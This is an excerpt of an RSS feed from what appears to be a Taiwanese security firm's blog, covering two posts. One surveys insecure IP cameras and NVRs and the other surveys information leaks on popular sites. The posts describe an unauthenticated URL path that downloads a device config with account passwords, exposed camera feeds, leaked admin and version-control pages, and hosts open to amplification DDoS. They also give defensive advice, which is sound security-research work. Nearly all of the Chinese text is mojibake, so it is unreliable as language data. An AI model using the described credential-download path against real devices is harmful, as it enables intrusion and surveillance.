    &lt;p&gt;é€™å€‹æ¡ˆä¾‹é›–ç„¶æ•¸é‡éå¸¸å°‘ï¼Œä½†æ˜¯å»éå¸¸åš´é‡ã€‚ç‚ºä»€éº¼å‘¢ï¼Ÿå› ç‚ºå» å•†æ²’æœ‰å°æ©Ÿæ•è³‡æ–™åšåš´æ ¼çš„æ¬Šé™æ§ç®¡ï¼Œåªè¦æ”»æ“Šè€…ç›´æ¥åœ¨ç¶²å€åˆ—è¼¸å…¥ http://IP/sys.binï¼Œå°±å¯ä»¥ç›´æ¥ä¸‹è¼‰ä¸€å€‹åç‚º sys.bin çš„æª”æ¡ˆï¼Œè€Œæ­¤æª”æ¡ˆæ˜¯ tgz æ ¼å¼ï¼Œè§£å£“ç¸®å¾Œå¯ä»¥å¾—åˆ° system_server.confï¼Œè©²æª”æ¡ˆä¸­å«æœ‰å¸³è™Ÿã€å¯†ç¢¼ï¼Œå› æ­¤å³ä¾¿ä½¿ç”¨è€…ä¿®æ”¹äº†é è¨­å¸³è™Ÿå¯†ç¢¼ï¼Œä¹Ÿæœƒå› ç‚ºé€™å€‹åš´é‡æ¼æ´è€Œè¼•æ˜“åœ°è¢«å…¥ä¾µã€‚&lt;a href=&quot;/assets/img/blog/20140924/case_study_05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_05.png&quot; alt=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 5&quot; title=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 5&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XXXXç§‘æŠ€ ï¼ˆæ•¸é‡ï¼š230+ï¼‰&lt;/p&gt;

    &lt;p&gt;é€™æ˜¯ä¸€å€‹éå¸¸ç¶“å…¸çš„æ¡ˆä¾‹ï¼ä¸€èˆ¬æ”»æ“Šè€…å…¥ä¾µæ”å½±æ©Ÿæœ€å¸¸è¦‹çš„å°±æ˜¯ç‚ºäº†å·çœ‹æ”å½±æ©Ÿç•«é¢ï¼Œå†é€²éšä¸€é»çš„å¯èƒ½æœƒæ§åˆ¶è©²æ”å½±æ©Ÿé€²ä¸€æ­¥æ”»æ“Šå…§ç¶²ã€‚è€Œé€™å®¶å» å•†èº«ç‚ºçŸ¥åä¿å…¨å…¬å¸æŠ•è³‡æˆç«‹çš„å®‰æ§å…¬å¸ï¼Œç†ç•¶ç‚ºå®¢æˆ¶çš„ç›£æ§ç•«é¢åšæœ€å‘¨å…¨çš„è¦åŠƒã€æœ€è¬¹æ…çš„é˜²è­·ï¼Œä½†æ˜¯çµæœå‘¢ï¼Ÿå ±å‘Šå„ä½ï¼Œå®Œå…¨æ²’æœ‰ä»»ä½•é˜²è­·ï¼åªè¦é€£åˆ° IP ä½å€å°±å¯ä»¥ç›´æ¥çœ‹åˆ°æ”å½±æ©Ÿç•«é¢ï¼Œä¹Ÿæ˜¯å±¬æ–¼è£¸å¥”ä¸€æ—â€¦&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¾é€™å¹¾å€‹æ¡ˆä¾‹æˆ‘å€‘å¯ä»¥ç™¼ç¾å°ç£ç›®å‰è‡³å°‘æœ‰ 3500 å°å·¦å³çš„å®‰æ§è¨­å‚™è™•æ–¼é«˜é¢¨éšªç‹€æ…‹ä¸­ï¼Œè€Œç”±æ–¼æˆ‘å€‘ç„¡æš‡å°æ¯ä¸€æ¬¾è¨­å‚™é€²è¡Œèª¿æŸ¥ï¼Œå› æ­¤é€™åƒ…åƒ…æ˜¯ä¸€å€‹æ¦‚ç•¥çš„èª¿æŸ¥çµæœã€‚åŒæ™‚é€™äº›è¨­å‚™éƒ½æ˜¯åœ¨ç¶²è·¯ä¸Šå¯ç›´æ¥é€£ç·šçš„ï¼Œè‹¥å†åŠ ä¸Šå„å€‹å…¬å®¶æ©Ÿé—œã€è¾¦å…¬å¤§æ¨“ã€ç¤¾å€çš„å…§ç¶²å®‰æ§è¨­å‚™ï¼Œææ€•æœƒæœ‰æ›´é©šäººçš„ç™¼ç¾ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å•é¡Œèµ·æº&quot;&gt;å•é¡Œèµ·æº&lt;/h3&gt;

&lt;p&gt;ç©¶ç«Ÿç‚ºä»€éº¼æœƒæœ‰é€™éº¼å¤šå®‰æ§è¨­å‚™è¢«å…¥ä¾µå‘¢ï¼Ÿå…¶å¯¦ä¸»è¦æœ‰å…©å€‹é¢å‘ã€‚ç¬¬ä¸€å€‹æ˜¯ç”±æ–¼è¨±å¤šå» å•†çš„é˜²ç¯„è§€å¿µä»åœç•™åœ¨èˆŠæ™‚ä»£ï¼Œä¸äº†è§£é§­å®¢åˆ°åº•éƒ½æ€éº¼æ”»æ“Šï¼Œå› æ­¤ä¹Ÿä¸äº†è§£ç¢ºåˆ‡çš„é˜²æ²»æ–¹æ³•ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œå» å•†åœ¨ç¶²è·¯å®‰æ§ç³»çµ±çš„ Web è¼¸å…¥ä»‹é¢éƒ½æœƒè¨­å®šè¨±å¤šé˜»æ“‹è¦å‰‡ï¼Œä»¥é˜²ç¯„å…¥ä¾µè€…è¼¸å…¥æƒ¡æ„æ”»æ“ŠæŒ‡ä»¤ï¼Œä½†æ˜¯é€™äº›é˜²æ²»æ‰‹æ®µéƒ½åƒ…åƒ…åšåœ¨ client ç«¯ï¼ˆç”¨ JavaScript ä¾†é˜²è­·ï¼‰ï¼Œå…¥ä¾µè€…åªè¦åˆ©ç”¨ proxy å·¥å…·æˆ–è‡ªè¡Œå¯«ç¨‹å¼ç™¼é€å®¢è£½åŒ– request å°±å¯ä»¥ç¹éé‚£äº›é©—è­‰ï¼Œè‹¥å» å•†æ²’æœ‰åœ¨ server ç«¯å†æ¬¡é€²è¡Œé©—è­‰è¼¸å…¥è³‡æ–™æ˜¯å¦ç•°å¸¸ï¼Œå°±æœ‰å¾ˆé«˜çš„æ©Ÿæœƒè¢«å…¥ä¾µæˆåŠŸã€‚&lt;/p&gt;

&lt;p&gt;å¦ä¸€æ–¹é¢å‰‡æ˜¯å…¥ä¾µè€…çš„æ”»æ“Šæ‰‹æ³•åƒè®Šè¬åŒ–ï¼Œé›£ä»¥ä¿è­‰ä¸æœƒæœ‰æ–°çš„ 0-Day å¼±é»å‡ºç¾ã€‚ä¾‹å¦‚ä»Šå¹´ä¸€æœˆä»½å¤§é‡çˆ†ç™¼çš„ NTP å¼±é» CVE-2013-5211 å°±å­˜åœ¨æ–¼ä¸Šè¿°å…­å€‹æ¡ˆä¾‹å…¶ä¸­ä¹‹ä¸€ï¼Œæˆ‘æƒ³å» å•†æ‡‰è©²ä¸æœƒæœ‰æ„é¡˜é‡å°èˆŠç”¢å“ä¿®å¾©æ­¤é¡æ¼æ´ï¼Œä¹Ÿå°±æ˜¯æœªä¾†éš¨æ™‚æœ‰å¹¾ç™¾å°çš„æ”å½±æ©Ÿå¯è¢«æƒ¡æ„äººå£«ç”¨ä¾†åŸ·è¡Œ DDoS æ”»æ“Šã€‚å¦å¤–ä»Šå¹´å››æœˆä»½çš„ OpenSSL Heartbleed å¼±é»æ›´æ˜¯ä¸€å€‹å…·æœ‰ä»£è¡¨æ€§çš„é‡è¦æ¡ˆä¾‹ï¼Œæˆ‘æƒ³é€™æ‡‰è©²æ˜¯è¨±å¤šå®‰æ§è¨­å‚™å» å•†éƒ½æœƒä½¿ç”¨çš„ç¨‹å¼ã€‚ç•¶å» å•†å°‡æ­¤é¡ç¨‹å¼ç´å…¥ç¶²è·¯å®‰æ§è¨­å‚™ä¸­ï¼Œæ–¼å¼±é»è¢«æ­éœ²æ™‚è‹¥ç„¡æ³•åŠæ™‚æœ‰æ•ˆä¿®è£œï¼Œæˆ–æ˜¯ä¿®è£œçš„æˆæœ¬å¤ªé«˜å°è‡´ç”¨æˆ¶ä¸é¡˜æ„ä¿®è£œã€æ²’æœ‰èƒ½åŠ›ä¿®è£œï¼Œå°±æœ‰å¯èƒ½é‡€æˆé‡å¤§ç½æƒ…ï¼Œä¸ä½†é€ æˆç”¨æˆ¶æå¤±ï¼Œä¹Ÿåš´é‡å½±éŸ¿å•†è­½ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å» å•†è©²å¦‚ä½•å› æ‡‰&quot;&gt;å» å•†è©²å¦‚ä½•å› æ‡‰ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;é‡å°æ­¤é¡è³‡å®‰å•é¡Œï¼Œå¤§å‹ç¡¬é«”å» å•†æ‡‰è©²è½å¯¦ä»¥ä¸‹å¹¾å€‹å‹•ä½œï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;æ”¹å–„è³‡å®‰å•é¡Œæ›´æ–°æµç¨‹ï¼šå°‡ç”¢å“çš„è³‡å®‰æ›´æ–°æ”¹è®Šæˆä¸»å‹•é€šçŸ¥ä½¿ç”¨è€…ï¼Œè€Œééœ€è¦ä½¿ç”¨è€…ä¸»å‹•åˆ°å®˜ç¶²çœ‹æ‰çŸ¥é“æ›´æ–°ï¼Œä»¥ç¸®çŸ­ä½¿ç”¨è€…æ›´æ–°çš„å¹³å‡é€±æœŸï¼Œç¢ºä¿ä½¿ç”¨è€…çš„è»Ÿé«”æ˜¯æœ€æ–°ç„¡é¢¨éšªç‰ˆæœ¬ã€‚&lt;/li&gt;
  &lt;li&gt;æˆç«‹å°ˆé–€è³‡å®‰å°çµ„ï¼šè«‹å°ˆäººè² è²¬æª¢é©—ç”¢å“çš„è³‡å®‰å“è³ªèˆ‡ä¿®æ­£è³‡å®‰å¼±é»ï¼Œä»¥ä¾¿å› æ‡‰è‡¨æ™‚çˆ†ç™¼çš„é‡å¤§å¼±é»ï¼Œç¶­æŒç”¢å“çš„è³‡å®‰å“è³ªã€‚&lt;/li&gt;
  &lt;li&gt;é»‘ç®±æ»²é€æ¸¬è©¦ï¼šæ–¼ç”¢å“å‡ºå» å‰åŸ·è¡Œé»‘ç®±æ»²é€æ¸¬è©¦ï¼Œè®“æ»²é€æ¸¬è©¦å°ˆå®¶å¾é»‘å¸½é§­å®¢çš„è§’åº¦ä¾†æª¢æŸ¥ç”¢å“æœ‰ç„¡æ¼æ´ã€‚&lt;/li&gt;
  &lt;li&gt;ç™½ç®±åŸå§‹ç¢¼æª¢æ¸¬ï¼šå®šæœŸåŸ·è¡ŒåŸå§‹ç¢¼æª¢æ¸¬ï¼Œå¾ç”¢å“çš„æ ¹æœ¬è™•è‘—æ‰‹æ”¹å–„ï¼Œé™ä½ç”¢å“ä¸Šå¸‚å¾Œæ‰è¢«ç™¼ç¾å¼±é»çš„æ©Ÿç‡ã€‚&lt;/li&gt;
  &lt;li&gt;è³‡å®‰æ•™è‚²è¨“ç·´ï¼šè«‹æœ‰å¯¦éš›æ”»é˜²ç¶“é©—çš„è³‡å®‰å°ˆå®¶çµ¦äºˆé–‹ç™¼äººå“¡æ­£ç¢ºçš„è³‡å®‰è§€å¿µï¼Œäº†è§£æœ€æ–°çš„æ”»æ“Šæ‰‹æ³•èˆ‡æœ‰æ•ˆé˜²ç¦¦ä¹‹é“ã€‚&lt;/li&gt;
  &lt;li&gt;å®šæœŸæª¢é–±ç”¢å“æ‰€ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹è»Ÿé«”å¥—ä»¶æ˜¯å¦æœ‰å¼±é»ï¼Œä¾‹å¦‚ OpenSSLï¼Œä»¥é¿å…æŠŠæœ‰å•é¡Œçš„ç‰ˆæœ¬ç´å…¥ç”¢å“ï¼Œé€ æˆç”¢å“é–“æ¥ç”¢ç”Ÿå¼±é»ï¼Œå› è€Œé­åˆ°å…¥ä¾µã€‚&lt;/li&gt;
  &lt;li&gt;å®šæ™‚æ–¼ç¶²è·¯ä¸Šæ”¶é›†ç”¢å“çš„ç›¸é—œå¼±é»è³‡æ–™ï¼Œä¾‹å¦‚ &lt;a href=&quot;http://secunia.com/&quot;&gt;Secunia&lt;/a&gt;ã€&lt;a href=&quot;http://www.securityfocus.com/&quot;&gt;SecurityFocus&lt;/a&gt;ã€&lt;a href=&quot;http://packetstormsecurity.com/&quot;&gt;Packet Storm&lt;/a&gt; ç­‰ç¶²ç«™éƒ½æ˜¯å¾ˆå¥½çš„è³‡è¨Šä¾†æºã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ä¸€èˆ¬ä½¿ç”¨è€…ä¼æ¥­è©²å¦‚ä½•äº¡ç¾Šè£œç‰¢&quot;&gt;ä¸€èˆ¬ä½¿ç”¨è€…ã€ä¼æ¥­è©²å¦‚ä½•äº¡ç¾Šè£œç‰¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ç›®å‰çš„ç¶²è·¯å®‰æ§ç³»çµ±ä½¿ç”¨è€…ä»æœªæœ‰è¶³å¤ çš„è³‡å®‰æ„è­˜ï¼Œä¸»è¦ç¾è±¡æœ‰ä»¥ä¸‹å¹¾é»ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ä½¿ç”¨å¼±å¯†ç¢¼&lt;/li&gt;
  &lt;li&gt;æœªé€²è¡Œé©ç•¶çš„æ¬Šé™åŠƒåˆ†èˆ‡ç®¡ç†&lt;/li&gt;
  &lt;li&gt;å®¹æ˜“é–‹å•“æ”»æ“Šè€…å¯„é€çš„æƒ¡æ„é€£çµï¼Œå°è‡´è¢« XSSã€CSRF ç­‰æ‰‹æ³•æ”»æ“Š&lt;/li&gt;
  &lt;li&gt;æœªé™åˆ¶é€£å…¥ IP ä½å€ï¼Œå°è‡´å®‰æ§ç³»çµ±å¯å¾å¤–ç¶²ä»»æ„å­˜å–&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç„¶è€Œï¼Œç„¡è«–æ˜¯å®‰æ§ç³»çµ±æˆ–å…¶ä»–ä»»ä½•é€£ç¶²è¨­å‚™ï¼Œæœªä¾†éƒ½æœ‰å¯èƒ½æˆç‚ºæ½›åœ¨çš„æ”»æ“Šç›®æ¨™ï¼Œè€Œä¸”åœ¨å» å•†æä¾›æ›´æ–°æª”ä¹‹å‰å…¶å¯¦ä¹Ÿå¾ˆé›£ç¢ºå¯¦åœ°è‡ªä¿ï¼Œå› æ­¤äº†è§£è³‡å®‰çŸ¥è­˜èˆ‡å¸¸è¦‹çš„æ”»æ“Šæ‰‹æ³•æ˜¯æœ‰å…¶å¿…è¦çš„ã€‚åŸºæœ¬çš„é˜²ç¯„ä¹‹é“å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ä½¿ç”¨å¼·å¯†ç¢¼ï¼ŒåŒ…å«å¤§å°å¯«è‹±æ–‡ã€æ•¸å­—ã€ç‰¹æ®Šç¬¦è™Ÿï¼Œä¸¦ä¸”å®šæœŸæ›´æ›å¯†ç¢¼&lt;/li&gt;
  &lt;li&gt;å‹¿åœ¨ç³»çµ±å»ºç«‹å¤ªå¤šä¸å¿…è¦çš„ä½¿ç”¨è€…å¸³è™Ÿã€å°‡å¤šé¤˜çš„å¸³è™Ÿç§»é™¤ï¼Œä»¥é™ä½å¸³è™Ÿè¢«ç›œçš„æ©Ÿç‡ã€‚è‹¥éœ€è¦å»ºç«‹å¤šçµ„å¸³è™Ÿï¼Œè«‹ä»”ç´°çµ¦äºˆé©ç•¶çš„æ¬Šé™&lt;/li&gt;
  &lt;li&gt;å‹¿éš¨æ„é–‹å•Ÿå¯ç–‘ä¿¡ä»¶é™„å¸¶çš„é€£çµæˆ–æª”æ¡ˆï¼Œä»¥é¿å…è¢«æ”»æ“Šè€…ä»¥ XSSã€CSRF ç­‰æ‰‹æ³•æ”»æ“Š&lt;/li&gt;
  &lt;li&gt;é™åˆ¶å¯å­˜å–è³‡è¨Šç³»çµ±çš„ IP ä½å€ï¼Œé¿å…è³‡è¨Šç³»çµ±æˆç‚ºå…¬é–‹çš„æ”»æ“Šç›®æ¨™&lt;/li&gt;
  &lt;li&gt;å®šæœŸæª¢æŸ¥ logï¼Œç¢ºèªæœ‰ç„¡ç•°å¸¸ç™»å…¥ã€ç•°å¸¸æ“ä½œç”šè‡³æ˜¯ç•°å¸¸å¸³è™Ÿç­‰è³‡è¨Š&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;åœ¨ç‰©é€£ç¶²çš„æ™‚ä»£ä¸­ï¼Œå„ç¨®å¯é€²è¡Œç„¡ç·šé€šè¨Šçš„è¨­å‚™è¢«æ”»æ“Šçš„äº‹ä»¶å±¢è¦‹ä¸é®®ï¼Œä¾‹å¦‚ 2011 å¹´çŸ¥åé§­å®¢ Jay Radcliffe åœ¨ Black Hat å±•ç¤ºå¦‚ä½•æ”»æ“Šèƒ°å³¶ç´ æ³¨å°„å™¨ï¼Œ2013 å¹´å·²æ•…é§­å®¢ Barnaby Jack åŸæœ¬è¦åœ¨ Black Hat å±•ç¤ºå¦‚ä½•åˆ©ç”¨è—èŠ½é€šè¨Šæ§åˆ¶å¿ƒå¾‹èª¿æ•´å™¨ï¼Œç”šè‡³ 2014 å¹´ç”«æ¨å‡ºçš„å¯é ç¨‹è®Šæ›é¡è‰²ç‡ˆæ³¡ä¹Ÿè¢«æ­éœ²æœ‰è³‡å®‰å•é¡Œã€‚åœ¨ä¸ä¹…çš„æœªä¾†ï¼Œé€™äº›è³‡å®‰å•é¡Œåªæœƒæ›´å¤šï¼Œèº«ç‚ºæ°‘çœ¾ã€ä¼æ¥­ã€å» å•†çš„ä½ ï¼Œæº–å‚™å¥½é¢å°è¬ç‰©çš†å¯é§­çš„ç‰©é€£ç¶²æ™‚ä»£äº†å—ï¼Ÿ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/</link>
                <guid>https://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr</guid>
                <pubDate>Wed, 24 Sep 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>è¢«éºå¿˜çš„è³‡è¨Šæ´©æ¼ï¼é‡é»å›é¡§</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;åœ¨ä»Šå¹´é§­å®¢å¹´æœƒä¼æ¥­å ´ï¼Œæˆ‘å€‘åˆ†äº«äº†ä¸€å ´ã€è¢«éºå¿˜çš„è³‡è¨Šæ´©æ¼ã€ã€‚è³‡è¨Šæ´©æ¼æ˜¯åå¹¾å¹´å‰å°±è¢«ä¸€æå†æçš„è­°é¡Œï¼Œåœ¨è³‡è¨Šå®‰å…¨é ˜åŸŸä¸­ä¹Ÿæ˜¯æœ€æœ€æœ€åŸºæœ¬è©²æ³¨æ„çš„äº‹æƒ…ï¼Œç„¶è€Œè‡³ä»Šå¾ˆå¤šç¶²ç«™éƒ½é‚„æ˜¯å¿½ç•¥å®ƒï¼Œç”šè‡³é€£ä¸€äº›ç†±é–€ç¶²ç«™éƒ½ä»æœ‰è³‡è¨Šæ´©æ¼å•é¡Œã€‚è­°ç¨‹ä¸­æˆ‘å€‘èˆ‰äº†å¤§é‡çš„ä¾‹å­è­‰æ˜è³‡è¨Šæ´©æ¼å…¶å¯¦å¯ä»¥å¾ˆåš´é‡ï¼Œå¸Œæœ›èƒ½å¹«å¤§å®¶è¤‡ç¿’ä¸€ä¸‹ï¼Œå¦‚æœç¶²ç«™æ²’æœ‰æ³¨æ„é€™äº›ï¼Œæœƒé€ æˆä»€éº¼æ¨£çš„å¾Œæœã€‚è­°ç¨‹æŠ•å½±ç‰‡å¦‚ä¸‹æ‰€ç¤ºï¼Œå°±è®“æˆ‘å€‘ä¾†ç¸½çµä¸€ä¸‹å§ï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;center&gt;&lt;iframe src=&quot;http://www.slideshare.net/slideshow/embed_code/38312258&quot; width=&quot;560&quot; height=&quot;460&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&quot;&gt; &lt;/iframe&gt;&lt;/center&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;devcore-å¸¸åˆ©ç”¨çš„è³‡è¨Šæ´©æ¼&quot;&gt;DEVCORE å¸¸åˆ©ç”¨çš„è³‡è¨Šæ´©æ¼&lt;/h3&gt;

&lt;p&gt;é¦–å…ˆæˆ‘å€‘å¾éå¾€æ»²é€æ¸¬è©¦ç¶“é©—ä¸­æŒ‘é¸äº†å¹¾å€‹å¸¸è¦‹çš„è³‡è¨Šæ´©æ¼å•é¡Œï¼Œåˆ†åˆ¥å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç®¡ç†ä»‹é¢æ´©æ¼ (p8-p19)&lt;/li&gt;
  &lt;li&gt;ç›®éŒ„(Index of)æ´©æ¼ (p20-p28)&lt;/li&gt;
  &lt;li&gt;éŒ¯èª¤è¨Šæ¯æ´©æ¼ (p29-p35)&lt;/li&gt;
  &lt;li&gt;æš«å­˜ã€æ¸¬è©¦è³‡è¨Š (p36-p46)&lt;/li&gt;
  &lt;li&gt;ç‰ˆæœ¬æ§ç®¡ (p47-p55)&lt;/li&gt;
  &lt;li&gt;DNS è³‡è¨Šæ´©æ¼ (p56-p63)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä»¥ä¸Šç¨®ç¨®ä¸åŒæ´©æ¼æ–¹å¼ï¼Œå¯èƒ½æœƒæ´©æ¼å‡ºç³»çµ±ç’°å¢ƒè³‡è¨Šã€ç¨‹å¼ç¢¼å…§å®¹ã€å«æœ‰å¸³è™Ÿå¯†ç¢¼çš„è¨­å®šæª”ç­‰ã€‚é€éé€™äº›è³‡è¨Šï¼Œé§­å®¢å°±èƒ½çµ„ç¹”å‡ºä¸€å€‹æœ‰æ•ˆçš„æ”»æ“Šè¡Œå‹•ã€‚æˆ‘å€‘ç”šè‡³åœ¨éå¾€çš„ç¶“é©—ä¸­ï¼Œåªé€éç›®æ¨™çš„è³‡è¨Šæ´©æ¼ï¼Œå°±ç›´æ¥å–å¾—è³‡æ–™åº«æ“ä½œæ¬Šé™(è©³è¦‹æŠ•å½±ç‰‡ p65-p71)ã€‚&lt;/p&gt;

&lt;p&gt;ç‚ºäº†è§£ç›®å‰ä¸€äº›ç†±é–€ç¶²ç«™æ˜¯å¦é‡è¦–é€™äº›æœ€åŸºæœ¬çš„ä¿è­·ï¼Œæˆ‘å€‘å¯¦éš›å° alexa å°ç£å‰ 525 åçš„ç¶²ç«™é€²è¡Œè³‡è¨Šæ´©æ¼çš„èª¿æŸ¥ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/phpmyadmin_leak.jpg&quot; alt=&quot;phpmyadmin é é¢æ´©æ¼ç‹€æ³&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20140826/phpinfo_leak.jpg&quot; alt=&quot;phpinfo é é¢æ´©æ¼ç‹€æ³&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ç®¡ç†ä»‹é¢å’Œæ¸¬è©¦é é¢æ´©æ¼çš„é …ç›®ï¼Œæˆ‘å€‘ç”¨å¾ˆä¿å®ˆçš„æ–¹å¼æ¸¬è©¦æ ¹ç›®éŒ„ä¸‹æ˜¯å¦å­˜æœ‰ phpmyadmin å’Œ phpinfo é é¢ï¼Œçµæœåˆ†åˆ¥æœ‰ 7% å’Œ 9% çš„ç¶²ç«™æœ‰é€™æ¨£çš„å•é¡Œã€‚é€™æ¨£çš„çµæœéå¸¸ä»¤äººè¨ç•°ï¼Œç•¢ç«Ÿå—æ¸¬ç¶²ç«™éƒ½æ˜¯çŸ¥åä¸”æœ‰æŠ€è¡“åŠ›çš„ç¶²ç«™ï¼Œè€Œä¸”ä¸¦éæ‰€æœ‰ç¶²ç«™éƒ½ä½¿ç”¨ php é–‹ç™¼ï¼Œå†åŠ ä¸Šæˆ‘å€‘åªæ˜¯æ¸¬è©¦é è¨­çš„å‘½åï¼Œå¯¦éš›æ´©æ¼çš„æƒ…æ³æœƒæ›´å¤šï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/version_control_leak.jpg&quot; alt=&quot;ç‰ˆæœ¬æ§åˆ¶æ´©æ¼ç‹€æ³&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¦ä¸€å€‹å€¼å¾—ä¸€æçš„æ˜¯ç‰ˆæœ¬æ§ç®¡æ´©æ¼å•é¡Œï¼Œæˆ‘å€‘åŒæ¨£ä¿å®ˆçš„åªé‡å°ç‰ˆæœ¬æ§ç®¡è»Ÿé«”ä¸­ GIT å’Œ SVN å…©é …é€²è¡Œèª¿æŸ¥ã€‚çµæœç«Ÿç„¶æœ‰ 10% çš„ç¶²ç«™æœ‰é€™æ¨£çš„å•é¡Œã€‚é€™å€‹ç¾è±¡éå¸¸åš´é‡ï¼é€™å€‹ç¾è±¡éå¸¸åš´é‡ï¼é€™å€‹ç¾è±¡éå¸¸åš´é‡ï¼é€™å€‹æ´©æ¼æœ‰æ©Ÿæœƒèƒ½é‚„åŸæ•´å€‹æœå‹™çš„åŸå§‹ç¢¼ï¼Œè¢«æ”»æ“ŠæˆåŠŸçš„æ©Ÿç‡ç›¸ç•¶é«˜ï¼å°ç£ç†±é–€çš„ç¶²ç«™è£¡ï¼Œåå€‹è£¡é¢å°±æœ‰ä¸€å€‹å­˜æœ‰é€™æ¨£çš„å•é¡Œï¼Œéå¸¸å±éšªï¼Œç…©è«‹çœ‹åˆ°é€™ç¯‡æ–‡ç« çš„æœ‹å‹èƒ½å»æ³¨æ„è²´å…¬å¸çš„ç¶²ç«™æ˜¯å¦å­˜åœ¨é€™æ¨£çš„å•é¡Œã€‚&lt;/p&gt;

&lt;h3 id=&quot;å¤§æ•¸æ“šè³‡æ–™è’é›†&quot;&gt;å¤§æ•¸æ“šè³‡æ–™è’é›†&lt;/h3&gt;

&lt;p&gt;åœ¨é€™å ´è­°ç¨‹ä¸­ï¼Œæˆ‘å€‘é‚„æåˆ°äº†å¦ä¸€å€‹å±¤æ¬¡çš„è³‡è¨Šæ´©æ¼è­°é¡Œï¼šç•¶å…¨ä¸–ç•Œä¸»æ©Ÿçš„æœå‹™åŠç‰ˆæœ¬è³‡è¨Šå…¨éƒ¨éƒ½è¢«æ”¶é›†èµ·ä¾†ï¼Œæœƒç™¼ç”Ÿä»€éº¼æ¨£çš„äº‹æƒ…ï¼Ÿ&lt;/p&gt;

&lt;p&gt;é§­å®¢æ“æœ‰é€™æ¨£çš„è³‡æ–™ï¼Œå°±èƒ½å¤ åœ¨éå¸¸çŸ­æš«çš„æ™‚é–“å…§ç¯©é¸å‡ºæœ‰å•é¡Œçš„ä¸»æ©Ÿï¼Œé€²è¡Œå¤§é‡çš„å…¥ä¾µã€‚æˆ‘å€‘åˆ©ç”¨é¡ä¼¼çš„æŠ€è¡“é‡å°å°ç£ä¸»æ©Ÿå¿«é€Ÿçš„é€²è¡Œæƒæï¼Œå°±ç™¼ç¾äº†å°ç£æœ‰ 61414 å°ä¸»æ©Ÿå¯ä»¥è¢«åˆ©ç”¨ä¾†åš DNS Amplification DDoS æ”»æ“Šã€1003 å°ä¸»æ©Ÿå¯ä»¥è¢«åˆ©ç”¨ä¾†åš NTP Amplification DDoS æ”»æ“Šã€‚ä¹Ÿå°±æ˜¯èªªï¼Œé§­å®¢å¯ä»¥åœ¨çŸ­æ™‚é–“å…§çµ„ç¹”ä¸€æ”¯å…­è¬å¤šäººçš„å°ç£å¤§è»ï¼Œå¯ä»¥é‡å°ä»–æƒ³è¦æ”»æ“Šçš„ç›®æ¨™é€²è¡Œæ”»æ“Šã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/heartbleed.jpg&quot; alt=&quot;OpenSSL Heartbleed å°šæœªä¿®å¾©çš„ç‹€æ³&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åˆ©ç”¨ç›¸åŒçš„æŠ€è¡“ï¼Œæˆ‘å€‘ä¹Ÿé †ä¾¿æª¢é©—äº†å‰é™£å­éå¸¸ç†±é–€çš„ &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; å•é¡Œã€‚OpenSSL Heartbleed è¢«ç¨±ä¹‹ç‚ºã€è¿‘åå¹´ç¶²è·¯æœ€åš´é‡çš„å®‰å…¨æ¼æ´ã€ï¼Œå…¶åš´é‡ç¨‹åº¦å¯ä»¥æƒ³è¦‹ï¼Œç„¶è€Œæ ¹æ“šæˆ‘å€‘çš„è§€å¯Ÿï¼Œå°ç£è‡³ä»Šä»æœ‰ 1480 å° HTTP ä¼ºæœå™¨å°šæœªä¿®å¾©ï¼Œè€Œå°ç£å‰ 525 å¤§ç†±é–€ç¶²ç«™ä¸­ï¼Œä¹Ÿæœ‰ 21 å€‹(4%)ç¶²ç«™æœªä¿®å¾©ã€‚è¶³è¦‹å°ç£ç¶²ç«™å°æ–¼è³‡å®‰çš„æ„è­˜ä»ç„¶ä¸å¤ ã€‚&lt;/p&gt;

